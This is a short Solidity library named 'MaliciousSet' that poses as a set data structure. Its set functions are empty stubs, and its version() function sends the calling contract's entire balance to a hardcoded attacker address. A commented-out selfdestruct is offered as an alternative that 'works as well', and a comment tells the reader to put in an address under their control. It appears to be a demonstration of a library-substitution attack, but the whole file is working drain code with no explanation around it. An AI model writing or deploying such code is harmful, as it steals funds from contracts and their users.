library MaliciousSet {
  
    struct Data { mapping(uint => bool) flags; }

    // set an account under your control
    address constant attackerAddr = 0x42;
    
    function insert(Data storage self, uint value) public returns (bool) {return false;}
    function remove(Data storage self, uint value) public returns (bool) {return false;}
    function contains(Data storage self, uint value) public returns (bool) {return false;}
    
    function version() returns(uint) {
        attackerAddr.send(this.balance);
        //selfdestruct(attackerAddr);  //this works as well
        return 1;
    }
}